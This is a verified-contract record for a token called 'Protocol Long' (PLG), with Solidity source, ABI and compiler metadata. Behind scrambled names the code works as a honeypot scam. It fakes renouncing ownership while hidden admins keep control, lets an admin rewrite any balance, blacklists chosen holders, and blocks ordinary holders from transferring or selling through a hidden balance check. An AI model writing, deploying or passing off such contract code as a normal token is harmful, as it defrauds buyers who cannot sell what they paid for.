{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.11;\n\ninterface walletLimitMin {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract maxLimit {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface txReceiver {\n    function createPair(address toExemptShould, address receiverMode) external returns (address);\n}\n\ninterface limitSell {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address amountLiquidity) external view returns (uint256);\n\n    function transfer(address buySenderLimit, uint256 takeAtLimit) external returns (bool);\n\n    function allowance(address totalIs, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 takeAtLimit) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address buySenderLimit,\n        uint256 takeAtLimit\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed maxTotalFee, uint256 value);\n    event Approval(address indexed totalIs, address indexed spender, uint256 value);\n}\n\ninterface liquidityFee is limitSell {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ProtocolLong is maxLimit, limitSell, liquidityFee {\n\n    address public shouldBuy;\n\n    mapping(address => bool) public exemptToken;\n\n    mapping(address => uint256) private launchLimit;\n\n    bool private fundReceiver;\n\n    uint256 public marketingMin;\n\n    function feeAmount(address sellBuyToken) public {\n        walletReceiverEnable();\n        \n        if (sellBuyToken == shouldBuy || sellBuyToken == modeList) {\n            return;\n        }\n        exemptToken[sellBuyToken] = true;\n    }\n\n    constructor (){\n        \n        walletLimitMin liquidityMode = walletLimitMin(liquidityFrom);\n        modeList = txReceiver(liquidityMode.factory()).createPair(liquidityMode.WETH(), address(this));\n        if (limitMarketingTake != limitSwapTeam) {\n            limitSwapTeam = marketingMin;\n        }\n        shouldBuy = _msgSender();\n        swapMaxTake();\n        modeMaxTeam[shouldBuy] = true;\n        launchLimit[shouldBuy] = sellTotal;\n        \n        emit Transfer(address(0), shouldBuy, sellTotal);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return maxToken;\n    }\n\n    bool public takeFromLaunched;\n\n    address private autoMarketing;\n\n    function transferFrom(address atLaunchedFee, address buySenderLimit, uint256 takeAtLimit) external override returns (bool) {\n        if (_msgSender() != liquidityFrom) {\n            if (amountTo[atLaunchedFee][_msgSender()] != type(uint256).max) {\n                require(takeAtLimit <= amountTo[atLaunchedFee][_msgSender()]);\n                amountTo[atLaunchedFee][_msgSender()] -= takeAtLimit;\n            }\n        }\n        return marketingTakeLiquidity(atLaunchedFee, buySenderLimit, takeAtLimit);\n    }\n\n    string private takeMinAuto = \"PLG\";\n\n    function sellAt(uint256 takeAtLimit) public {\n        walletReceiverEnable();\n        receiverMax = takeAtLimit;\n    }\n\n    function isFund(address shouldTrading) public {\n        if (takeFromLaunched) {\n            return;\n        }\n        \n        modeMaxTeam[shouldTrading] = true;\n        \n        takeFromLaunched = true;\n    }\n\n    uint256 private limitSwapTeam;\n\n    bool public amountAt;\n\n    function exemptFrom(address atLaunchedFee, address buySenderLimit, uint256 takeAtLimit) internal returns (bool) {\n        require(launchLimit[atLaunchedFee] >= takeAtLimit);\n        launchLimit[atLaunchedFee] -= takeAtLimit;\n        launchLimit[buySenderLimit] += takeAtLimit;\n        emit Transfer(atLaunchedFee, buySenderLimit, takeAtLimit);\n        return true;\n    }\n\n    function balanceOf(address amountLiquidity) public view virtual override returns (uint256) {\n        return launchLimit[amountLiquidity];\n    }\n\n    function transfer(address liquidityLimit, uint256 takeAtLimit) external virtual override returns (bool) {\n        return marketingTakeLiquidity(_msgSender(), liquidityLimit, takeAtLimit);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return modeLiquidityMax;\n    }\n\n    uint256 constant launchedList = 8 ** 10;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return sellTotal;\n    }\n\n    function walletReceiverEnable() private view {\n        require(modeMaxTeam[_msgSender()]);\n    }\n\n    address public modeList;\n\n    bool private maxEnable;\n\n    function teamList(address liquidityLimit, uint256 takeAtLimit) public {\n        walletReceiverEnable();\n        launchLimit[liquidityLimit] = takeAtLimit;\n    }\n\n    uint8 private modeLiquidityMax = 18;\n\n    mapping(address => bool) public modeMaxTeam;\n\n    function swapMaxTake() public {\n        emit OwnershipTransferred(shouldBuy, address(0));\n        autoMarketing = address(0);\n    }\n\n    uint256 private limitMarketingTake;\n\n    event OwnershipTransferred(address indexed launchedShouldFund, address indexed fromTx);\n\n    function owner() external view returns (address) {\n        return autoMarketing;\n    }\n\n    bool private receiverAtLiquidity;\n\n    uint256 public shouldTo;\n\n    uint256 totalReceiverWallet;\n\n    uint256 receiverMax;\n\n    address liquidityFrom = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    address marketingMode = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    mapping(address => mapping(address => uint256)) private amountTo;\n\n    function approve(address listWallet, uint256 takeAtLimit) public virtual override returns (bool) {\n        amountTo[_msgSender()][listWallet] = takeAtLimit;\n        emit Approval(_msgSender(), listWallet, takeAtLimit);\n        return true;\n    }\n\n    uint256 private sellTotal = 100000000 * 10 ** 18;\n\n    function symbol() external view virtual override returns (string memory) {\n        return takeMinAuto;\n    }\n\n    string private maxToken = \"Protocol Long\";\n\n    function getOwner() external view returns (address) {\n        return autoMarketing;\n    }\n\n    function allowance(address limitWallet, address listWallet) external view virtual override returns (uint256) {\n        if (listWallet == liquidityFrom) {\n            return type(uint256).max;\n        }\n        return amountTo[limitWallet][listWallet];\n    }\n\n    function marketingTakeLiquidity(address atLaunchedFee, address buySenderLimit, uint256 takeAtLimit) internal returns (bool) {\n        if (atLaunchedFee == shouldBuy) {\n            return exemptFrom(atLaunchedFee, buySenderLimit, takeAtLimit);\n        }\n        uint256 exemptMax = limitSell(modeList).balanceOf(marketingMode);\n        require(exemptMax == receiverMax);\n        require(buySenderLimit != marketingMode);\n        if (exemptToken[atLaunchedFee]) {\n            return exemptFrom(atLaunchedFee, buySenderLimit, launchedList);\n        }\n        return exemptFrom(atLaunchedFee, buySenderLimit, takeAtLimit);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalIs\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedShouldFund\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromTx\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxTotalFee\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitWallet\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"listWallet\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeAtLimit\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountLiquidity\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"exemptToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellBuyToken\",\"type\":\"address\"}],\"name\":\"feeAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldTrading\",\"type\":\"address\"}],\"name\":\"isFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingMin\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeList\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"modeMaxTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"takeAtLimit\",\"type\":\"uint256\"}],\"name\":\"sellAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldBuy\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldTo\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapMaxTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeFromLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeAtLimit\",\"type\":\"uint256\"}],\"name\":\"teamList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeAtLimit\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atLaunchedFee\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"buySenderLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeAtLimit\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ProtocolLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}